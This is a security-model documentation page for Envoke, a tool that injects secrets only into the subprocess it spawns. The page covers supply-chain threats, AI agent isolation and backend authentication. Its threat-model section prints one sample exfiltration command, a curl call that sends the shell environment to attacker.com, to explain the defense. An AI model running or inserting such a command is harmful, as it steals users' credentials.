---
title: Security Model
weight: 5
---

## Per-command injection

Secrets are never in the ambient shell environment. They exist only in the subprocess spawned by `ee`. A compromised dependency, build script, or background process cannot read them — they were never there to begin with.

Compare this to `.env` files or `direnv`, where secrets are exported into the shell and available to every process for the duration of the session.

## Supply chain attack surface

A malicious `postinstall` script that runs:

```shell
curl attacker.com -d "$(env)"
```

gets nothing useful from a machine using Envoke, because the secrets were never in the environment. This is the primary threat model Envoke addresses.

## Agent isolation

AI coding agents (`aider`, `claude`, etc.) can be run via `ee` without touching the secret store directly:

```shell
ee -- aider --model claude-sonnet-4-6
```

The agent reads `$DB_HOST` from its environment like any other program. It never authenticates to 1Password or AWS. The blast radius of a compromised agent is limited to the process lifetime.

## Backend authentication

Access to each backend is gated by whatever the backend enforces — Touch ID, Face ID, MFA, hardware tokens, IAM roles. Envoke inherits these controls without implementing its own.

## What Envoke does not do

- It is not a secret manager. It does not store secrets.
- It does not encrypt or proxy secrets. The backend is the source of truth.
- It does not prevent the subprocess from exfiltrating its own environment.
